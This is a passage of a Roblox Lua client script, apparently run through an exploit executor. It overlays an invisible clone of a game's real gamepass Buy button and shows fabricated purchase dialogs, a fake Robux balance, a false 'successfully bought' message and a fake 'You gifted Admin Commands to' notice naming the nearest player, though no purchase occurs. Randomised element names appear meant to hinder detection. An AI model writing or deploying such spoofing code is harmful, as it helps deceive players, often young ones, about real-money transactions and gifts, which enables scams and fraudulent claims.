    ConfirmCloseIcon.BackgroundTransparency = 1
    ConfirmCloseIcon.ZIndex             = 13
    ConfirmCloseIcon.Parent             = ConfirmClose

    local SuccessIcon = Instance.new("ImageLabel")
    SuccessIcon.Name             = "uoUnWoUYep"
    SuccessIcon.Image            = IMG_SUCCESS_ICON
    SuccessIcon.AnchorPoint      = Vector2.new(0.5, 0)
    SuccessIcon.Position         = UDim2.new(0.5, -2, 0, 66)
    SuccessIcon.Size             = UDim2.new(0, 62, 0, 62)
    SuccessIcon.BackgroundTransparency = 1
    SuccessIcon.ZIndex           = 12
    SuccessIcon.Parent           = ConfirmCard

    local ConfirmBody = Instance.new("TextLabel")
    ConfirmBody.Name               = "vZHtVvUlgS"
    ConfirmBody.Size               = UDim2.new(1, -28, 0, 36)
    ConfirmBody.Position           = UDim2.new(0, 14, 0, 128)
    ConfirmBody.BackgroundTransparency = 1
    ConfirmBody.Text               = "You have successfully bought '[GIFT] Admin Commands'."
    ConfirmBody.TextColor3         = Color3.new(0.784314, 0.784314, 0.784314)
    ConfirmBody.TextSize           = 13
    ConfirmBody.Font               = Enum.Font.Gotham
    ConfirmBody.TextWrapped        = true
    ConfirmBody.TextXAlignment     = Enum.TextXAlignment.Left
    ConfirmBody.ZIndex             = 12
    ConfirmBody.Parent             = ConfirmCard

    local OkBtn = Instance.new("TextButton")
    OkBtn.Name             = "LXsOARjhQC"
    OkBtn.Size             = UDim2.new(1, -28, 0, 34)
    OkBtn.Position         = UDim2.new(0, 14, 0, 178)
    OkBtn.BackgroundColor3 = COLOR_BUY_BTN
    OkBtn.BorderSizePixel  = 0
    OkBtn.Text             = ""
    OkBtn.ZIndex           = 12
    OkBtn.Parent           = ConfirmCard

    local OkCorner = Instance.new("UICorner")
    OkCorner.CornerRadius = UDim.new(0, 8)
    OkCorner.Parent       = OkBtn

    local OkLabel = Instance.new("TextLabel")
    OkLabel.Name               = "euRvIuiybG"
    OkLabel.Size               = UDim2.new(1, 0, 1, 0)
    OkLabel.BackgroundTransparency = 1
    OkLabel.Text               = "OK"
    OkLabel.TextColor3         = Color3.new(1, 1, 1)
    OkLabel.TextSize           = 14
    OkLabel.Font               = Enum.Font.GothamBold
    OkLabel.ZIndex             = 13
    OkLabel.Parent             = OkBtn

    ConfirmGui.Parent = CoreGui
    PlayModalEntryAnimation(Scrim2, ConfirmCard)

    local function closeConfirm()
        ConfirmGui:Destroy()
        if onDone then onDone(targetPlayer) end
    end

    OkBtn.MouseButton1Click:Connect(closeConfirm)
    ConfirmClose.MouseButton1Click:Connect(closeConfirm)
end

--------------------------------------------------------------------
--[ PHASE 4: Gift Notification ]--
--------------------------------------------------------------------

local function ShowGiftNotification(recipientName)
    local NotifContainer = PlayerGui:FindFirstChild("Notification")
        and PlayerGui.Notification:FindFirstChild("Notification")
    if not NotifContainer then return end

    local Template = NotifContainer:FindFirstChild("Template")
    if not Template then return end

    local notif = Template:Clone()
    notif.Visible     = true
    notif.RichText    = true
    notif.TextColor3  = Color3.new(0.219608, 0.843137, 0.341176)
    notif.Text        = "You gifted Admin Commands to " .. tostring(recipientName) .. "!"

    for _, desc in ipairs(notif:GetDescendants()) do
        if desc:IsA("UIStroke") or desc.ClassName == "Frame" then
            pcall(function() desc.Color = Color3.new(0, 0, 0) end)
        end
    end

    notif.Parent = NotifContainer

    local GiftSound = Instance.new("Sound")
    GiftSound.SoundId = SOUND_GIFT
    GiftSound.Volume  = 1
    GiftSound.Parent  = SoundService
    GiftSound:Play()
    Debris:AddItem(GiftSound, 5)

    Debris:AddItem(notif, 5)
end

--------------------------------------------------------------------
--[ PHASE 5: Secondary Shop Prompt (QWVJwGTlzXpn) ]--
--------------------------------------------------------------------

local function ShowSecondaryShopPrompt(playerBalance, onConfirm, onClose)
    local ShopGui2 = Instance.new("ScreenGui")
    ShopGui2.Name           = "QWVJwGTlzXpn"
    ShopGui2.DisplayOrder   = 999
    ShopGui2.ResetOnSpawn   = false
    ShopGui2.IgnoreGuiInset = true

    ShopGui2.AncestryChanged:Connect(function()
        if not ShopGui2.Parent then
            ShopGui2:Destroy()
        end
    end)

    local Sentinel = Instance.new("Frame")
    Sentinel.Name                = "UqdcQWlJKT"
    Sentinel.Size                = UDim2.new(1, 0, 1, 0)
    Sentinel.BackgroundTransparency = 1
    Sentinel.BorderSizePixel     = 0
    Sentinel.Parent              = ShopGui2

    local Scrim3 = Instance.new("Frame")
    Scrim3.Name                = "ScrimBG"
    Scrim3.Size                = UDim2.new(1, 0, 1, 0)
    Scrim3.BackgroundColor3    = Color3.new(0, 0, 0)
    Scrim3.BackgroundTransparency = 0.4
    Scrim3.BorderSizePixel     = 0
    Scrim3.ZIndex              = 10
    Scrim3.Parent              = ShopGui2

    local ShopCard2 = Instance.new("Frame")
    ShopCard2.Name             = "luGELGQFXf"
    ShopCard2.Size             = UDim2.new(0, 420, 0, 184)
    ShopCard2.Position         = UDim2.new(0.5, 0, 0.5, 0)
    ShopCard2.AnchorPoint      = Vector2.new(0.5, 0.5)
    ShopCard2.BackgroundColor3 = COLOR_MODAL_BG
    ShopCard2.BorderSizePixel  = 0
    ShopCard2.ZIndex           = 11
    ShopCard2.Parent           = ShopGui2

    local ShopCard2Corner = Instance.new("UICorner")
    ShopCard2Corner.CornerRadius = UDim.new(0, 10)
    ShopCard2Corner.Parent       = ShopCard2

    local ShopHeader2 = Instance.new("TextLabel")
    ShopHeader2.Name               = "OeAbJqakNn"
    ShopHeader2.Size               = UDim2.new(1, -160, 0, 52)
    ShopHeader2.Position           = UDim2.new(0, 16, 0, 0)
    ShopHeader2.BackgroundTransparency = 1
    ShopHeader2.Text               = "Buy item"
    ShopHeader2.TextColor3         = Color3.new(1, 1, 1)
    ShopHeader2.TextSize           = 20
    ShopHeader2.Font               = Enum.Font.BuilderSansMedium
    ShopHeader2.TextYAlignment     = Enum.TextYAlignment.Center
    ShopHeader2.TextXAlignment     = Enum.TextXAlignment.Left
    ShopHeader2.ZIndex             = 12
    ShopHeader2.Parent             = ShopCard2

    local CloseBtn2 = Instance.new("ImageButton")
    CloseBtn2.Name                = "HRTvQVETaY"
    CloseBtn2.BackgroundTransparency = 1
    CloseBtn2.Position            = UDim2.new(1, -44, 0, 0)
    CloseBtn2.Size                = UDim2.new(0, 44, 0, 52)
    CloseBtn2.ZIndex              = 12
    CloseBtn2.Parent              = ShopCard2

    local CloseIcon2 = Instance.new("ImageLabel")
    CloseIcon2.Name               = "FymBZNUkBP"
    CloseIcon2.Image              = IMG_X_BUTTON
    CloseIcon2.ImageColor3        = COLOR_ICON_GREY
    CloseIcon2.ScaleType          = Enum.ScaleType.Fit
    CloseIcon2.AnchorPoint        = Vector2.new(0.5, 0.5)
    CloseIcon2.Position           = UDim2.new(0.5, 0, 0.5, 0)
    CloseIcon2.Size               = UDim2.new(0, 22, 0, 22)
    CloseIcon2.BackgroundTransparency = 1
    CloseIcon2.ZIndex             = 13
    CloseIcon2.Parent             = CloseBtn2

    local BalRow2 = Instance.new("Frame")
    BalRow2.Name             = "QvqQTTfykn"
    BalRow2.Size             = UDim2.new(0, 90, 0, 52)
    BalRow2.Position         = UDim2.new(1, -104, 0, 0)
    BalRow2.BackgroundTransparency = 1
    BalRow2.ZIndex           = 12
    BalRow2.Parent           = ShopCard2

    local RobuxIcon2 = Instance.new("ImageLabel")
    RobuxIcon2.Name               = "RobuxIcon2"
    RobuxIcon2.Image              = IMG_ROBUX
    RobuxIcon2.ScaleType          = Enum.ScaleType.Fit
    RobuxIcon2.Size               = UDim2.new(0, 16, 0, 16)
    RobuxIcon2.AnchorPoint        = Vector2.new(0, 0.5)
    RobuxIcon2.Position           = UDim2.new(0, 0, 0.5, 0)
    RobuxIcon2.BackgroundTransparency = 1
    RobuxIcon2.BorderSizePixel    = 0
    RobuxIcon2.ZIndex             = 12
    RobuxIcon2.Parent             = BalRow2

    local BalLabel2 = Instance.new("TextLabel")
    BalLabel2.Name               = "UtoTkbxrhY"
    BalLabel2.Size               = UDim2.new(1, -22, 1, 0)
    BalLabel2.Position           = UDim2.new(0, 22, 0, 0)
    BalLabel2.BackgroundTransparency = 1
    BalLabel2.Text               = playerBalance or "316,696"
    BalLabel2.TextColor3         = COLOR_ICON_GREY
    BalLabel2.TextSize           = 15
    BalLabel2.Font               = Enum.Font.GothamMedium
    BalLabel2.TextXAlignment     = Enum.TextXAlignment.Left
    BalLabel2.TextYAlignment     = Enum.TextYAlignment.Center
    BalLabel2.ZIndex             = 12
    BalLabel2.Parent             = BalRow2

    local ItemRow2 = Instance.new("Frame")
    ItemRow2.Name             = "JJXZDShNcj"
    ItemRow2.Size             = UDim2.new(1, -32, 0, 64)
    ItemRow2.Position         = UDim2.new(0, 16, 0, 62)
    ItemRow2.BackgroundTransparency = 1
    ItemRow2.ZIndex           = 12
    ItemRow2.Parent           = ShopCard2

    local ItemThumb2 = Instance.new("ImageLabel")
    ItemThumb2.Name             = "KsLVgrRXQh"
    ItemThumb2.Image            = IMG_ITEM_THUMB
    ItemThumb2.AnchorPoint      = Vector2.new(0, 0.5)
    ItemThumb2.Position         = UDim2.new(0, 0, 0.5, -6)
    ItemThumb2.Size             = UDim2.new(0, 46, 0, 46)
    ItemThumb2.BackgroundTransparency = 1
    ItemThumb2.BorderSizePixel  = 0
    ItemThumb2.ZIndex           = 12
    ItemThumb2.Parent           = ItemRow2

    local ItemName2 = Instance.new("TextLabel")
    ItemName2.Name               = "gbVBuiwftW"
    ItemName2.Size               = UDim2.new(1, -60, 0, 20)
    ItemName2.Position           = UDim2.new(0, 58, 0, 5)
    ItemName2.BackgroundTransparency = 1
    ItemName2.Text               = "[GIFT] Admin Commands"
    ItemName2.TextColor3         = Color3.new(1, 1, 1)
    ItemName2.TextSize           = 14
    ItemName2.Font               = Enum.Font.GothamMedium
    ItemName2.TextXAlignment     = Enum.TextXAlignment.Left
    ItemName2.ZIndex             = 12
    ItemName2.Parent             = ItemRow2

    local PriceRow2 = Instance.new("Frame")
    PriceRow2.Name             = "CYaXySTQKM"
    PriceRow2.Size             = UDim2.new(0, 120, 0, 18)
    PriceRow2.Position         = UDim2.new(0, 54, 0, 29)
    PriceRow2.BackgroundTransparency = 1
    PriceRow2.ZIndex           = 12
    PriceRow2.Parent           = ItemRow2

    local PriceIconLabel2 = Instance.new("ImageLabel")
    PriceIconLabel2.Name               = "puNZZopGTO"
    PriceIconLabel2.Image              = IMG_ROBUX
    PriceIconLabel2.ScaleType          = Enum.ScaleType.Fit
    PriceIconLabel2.Size               = UDim2.new(0, 16, 0, 16)
    PriceIconLabel2.AnchorPoint        = Vector2.new(0, 0.5)
    PriceIconLabel2.Position           = UDim2.new(0, 0, 0.5, 0)
    PriceIconLabel2.BackgroundTransparency = 1
    PriceIconLabel2.BorderSizePixel    = 0
    PriceIconLabel2.ZIndex             = 13
    PriceIconLabel2.Parent             = PriceRow2

    local PriceValue2 = Instance.new("TextLabel")
    PriceValue2.Name               = "iyAhcvCWsd"
    PriceValue2.Size               = UDim2.new(1, -22, 1, 0)
    PriceValue2.Position           = UDim2.new(0, 22, 0, 0)
    PriceValue2.BackgroundTransparency = 1
    PriceValue2.Text               = "7,499"
    PriceValue2.TextColor3         = Color3.new(1, 1, 1)
    PriceValue2.TextSize           = 13
    PriceValue2.Font               = Enum.Font.GothamMedium
    PriceValue2.TextXAlignment     = Enum.TextXAlignment.Left
    PriceValue2.TextYAlignment     = Enum.TextYAlignment.Center
    PriceValue2.ZIndex             = 13
    PriceValue2.Parent             = PriceRow2

    local BuyBtn2 = Instance.new("TextButton")
    BuyBtn2.Name             = "GhYsgxAhTC"
    BuyBtn2.Size             = UDim2.new(1, -28, 0, 34)
    BuyBtn2.Position         = UDim2.new(0, 14, 0, 140)
    BuyBtn2.BackgroundColor3 = Color3.new(0.0863, 0.0863, 0.1255)
    BuyBtn2.BorderSizePixel  = 0
    BuyBtn2.ClipsDescendants = true
    BuyBtn2.Text             = ""
    BuyBtn2.AutoButtonColor  = false
    BuyBtn2.Active           = false
    BuyBtn2.ZIndex           = 12
    BuyBtn2.Parent           = ShopCard2

    local BuyBtn2Corner = Instance.new("UICorner")
    BuyBtn2Corner.CornerRadius = UDim.new(0, 8)
    BuyBtn2Corner.Parent       = BuyBtn2

    -- Bright blue loading fill (matches screenshot)
    local LoadingFill2 = Instance.new("Frame")
    LoadingFill2.Name             = "LoadingFill2"
    LoadingFill2.Size             = UDim2.new(0, 0, 1, 0)
    LoadingFill2.Position         = UDim2.new(0, 0, 0, 0)
    LoadingFill2.BackgroundColor3 = COLOR_BUY_LOADING
    LoadingFill2.BorderSizePixel  = 0
    LoadingFill2.ZIndex           = 13
    LoadingFill2.Parent           = BuyBtn2

    local LoadingFill2Corner = Instance.new("UICorner")
    LoadingFill2Corner.CornerRadius = UDim.new(0, 8)
    LoadingFill2Corner.Parent       = LoadingFill2

    local LoadShimmer2 = Instance.new("Frame")
    LoadShimmer2.Name                = "LoadShimmer2"
    LoadShimmer2.Size                = UDim2.new(0.5, 0, 1, 0)
    LoadShimmer2.Position            = UDim2.new(-0.5, 0, 0, 0)
    LoadShimmer2.BackgroundColor3    = Color3.new(1, 1, 1)
    LoadShimmer2.BackgroundTransparency = 1
    LoadShimmer2.BorderSizePixel     = 0
    LoadShimmer2.ZIndex              = 14
    LoadShimmer2.Parent              = LoadingFill2

    local LoadShimmerGrad2 = Instance.new("UIGradient")
    LoadShimmerGrad2.Transparency = NumberSequence.new({
        NumberSequenceKeypoint.new(0,   1),
        NumberSequenceKeypoint.new(0.4, 0.75),
        NumberSequenceKeypoint.new(0.6, 0.75),
        NumberSequenceKeypoint.new(1,   1),
    })
    LoadShimmerGrad2.Parent = LoadShimmer2

    local BuyLabel2 = Instance.new("TextLabel")
    BuyLabel2.Name               = "xjKKzUdjOe"
    BuyLabel2.Size               = UDim2.new(1, 0, 1, 0)
    BuyLabel2.BackgroundTransparency = 1
    BuyLabel2.Text               = "Buy"
    BuyLabel2.TextColor3         = Color3.new(1, 1, 1)
    BuyLabel2.TextTransparency   = 0.55
    BuyLabel2.TextSize           = 14
    BuyLabel2.Font               = Enum.Font.GothamBold
    BuyLabel2.ZIndex             = 15
    BuyLabel2.Parent             = BuyBtn2

    ShopGui2.Parent = CoreGui
    PlayModalEntryAnimation(Scrim3, ShopCard2)

    local function sweepShimmer2()
        if not LoadingFill2.Parent then return end
        LoadShimmer2.Position = UDim2.new(-0.5, 0, 0, 0)
        local st = TweenService:Create(LoadShimmer2, TweenInfo.new(1.4, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut), {
            Position = UDim2.new(1, 0, 0, 0),
        })
        st:Play()
        st.Completed:Connect(function(s)
            if s == Enum.PlaybackState.Completed and LoadingFill2.Parent then
                sweepShimmer2()
            end
        end)
    end

    task.delay(0.5, function()
        sweepShimmer2()

        local fillTween2 = TweenService:Create(LoadingFill2, TweenInfo.new(2.0, Enum.EasingStyle.Sine, Enum.EasingDirection.In), {
            Size = UDim2.new(1, 0, 1, 0),
        })
        fillTween2:Play()
        fillTween2.Completed:Connect(function()
            BuyBtn2.BackgroundColor3         = COLOR_BUY_BTN
            LoadingFill2.BackgroundColor3    = COLOR_BUY_BTN
            LoadingFill2.Size                = UDim2.new(1, 0, 1, 0)

            TweenService:Create(BuyLabel2, TweenInfo.new(0.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
                TextTransparency = 0,
            }):Play()

            BuyBtn2.Active = true
        end)
    end)

    CloseBtn2.MouseButton1Click:Connect(function()
        ShopGui2:Destroy()
        if onClose then onClose() end
    end)

    BuyBtn2.MouseButton1Click:Connect(function()
        if not BuyBtn2.Active then return end
        BuyBtn2.Active = false

        -- Processing hold: slightly darken, keep "Buy" text (no "...")
        TweenService:Create(LoadingFill2, TweenInfo.new(0.1), {
            BackgroundColor3 = COLOR_BUY_PROCESSING,
        }):Play()
        -- BuyLabel2.Text stays as "Buy"

        task.delay(1.0, function()
            ShopGui2:Destroy()
            if onConfirm then onConfirm() end
        end)
    end)
end

--------------------------------------------------------------------
--[ Main Execution Flow ]--
--------------------------------------------------------------------

local function InterceptBuyButton()
    local GamepassList = PlayerGui:FindFirstChild("Shop")
        and PlayerGui.Shop:FindFirstChild("Shop")
        and PlayerGui.Shop.Shop:FindFirstChild("Content")
        and PlayerGui.Shop.Shop.Content:FindFirstChild("List")
        and PlayerGui.Shop.Shop.Content.List:FindFirstChild("GamepassList")
        and PlayerGui.Shop.Shop.Content.List.GamepassList:FindFirstChild("1227013099")

    if not GamepassList then return end

    local RealBuy = GamepassList:FindFirstChild("Buy")
    if not RealBuy then return end

    local FakeBuy = RealBuy:Clone()
    FakeBuy.Name               = "kravhjZhJD"
    FakeBuy.Active             = false
    FakeBuy.AutoButtonColor    = false
    FakeBuy.ImageTransparency  = 1
    FakeBuy.BackgroundTransparency = 1
    FakeBuy.ZIndex             = RealBuy.ZIndex + 1

    for _, d in ipairs(FakeBuy:GetDescendants()) do
        pcall(function() d.TextTransparency = 1 end)
        pcall(function() d.Transparency     = 1 end)
        pcall(function() d.ImageTransparency = 1 end)
    end

    local HoverScale = Instance.new("UIScale")
    HoverScale.Scale  = 1
    HoverScale.Parent = FakeBuy

    FakeBuy.MouseEnter:Connect(function()
        TweenService:Create(HoverScale, TweenInfo.new(0.15), { Scale = 1.04 }):Play()
    end)
    FakeBuy.MouseLeave:Connect(function()
        TweenService:Create(HoverScale, TweenInfo.new(0.15), { Scale = 1 }):Play()
    end)

    FakeBuy.Parent = GamepassList
    FakeBuy.Active = true

    local function getNearestPlayer()
        local myChar = LocalPlayer.Character
        if not myChar or not myChar:FindFirstChild("HumanoidRootPart") then return nil end
        local myPos  = myChar.HumanoidRootPart.Position
        local best, bestDist = nil, math.huge
        for _, p in ipairs(Players:GetPlayers()) do
            if p ~= LocalPlayer then
                local c = p.Character
                if c and c:FindFirstChild("HumanoidRootPart") then
                    local d = (c.HumanoidRootPart.Position - myPos).Magnitude
                    if d < bestDist then
                        best, bestDist = p, d
                    end
                end
            end
        end
        return best
    end

    FakeBuy.MouseButton1Click:Connect(function()
        local target = getNearestPlayer()
        task.wait(0.3)

        ShowBuyModal(
            "[GIFT] Admin Commands",
            "7,499",
            IMG_ITEM_THUMB,
            "1,214,231",
            function()
                ShowPurchaseConfirmation(target, function(recipient)
                    local recipientName = recipient and recipient.Name or "Unknown"
                    ShowGiftNotification(recipientName)

                    task.delay(1, function()
                        ShowSecondaryShopPrompt("316,696",
                            function()
                                ShowPurchaseConfirmation(nil, function()
                                    local nextTarget = getNearestPlayer()
                                    if nextTarget then
                                        ShowGiftNotification(nextTarget.Name)
                                    end
                                end)
                            end,
                            function() end
                        )
                    end)
                end)
            end,
            function() end
        )
    end)
end

task.defer(InterceptBuyButton)
